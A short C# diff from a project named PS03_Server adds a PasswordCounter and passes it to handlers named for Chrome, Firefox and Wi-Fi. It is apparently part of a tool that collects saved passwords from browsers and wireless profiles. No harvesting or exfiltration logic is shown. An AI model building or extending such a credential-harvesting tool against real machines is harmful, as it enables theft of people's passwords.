@@ -7,14 +7,16 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using ConsoleApplication1;
+using PS03.PostOperation;
 
 namespace PS03_Server
 {
     class Program
     {
-        static ChromeHandler chromehandler = new ChromeHandler();
-        static WifiHandler wifihandler = new WifiHandler();
-        static FirefoxHandler firefoxhandler = new FirefoxHandler();
+        static PasswordCounter pwc = new PasswordCounter();
+        static ChromeHandler chromehandler = new ChromeHandler(pwc);
+        static WifiHandler wifihandler = new WifiHandler(pwc);
+        static FirefoxHandler firefoxhandler = new FirefoxHandler(pwc);
 
 
         static void Main(string[] args)
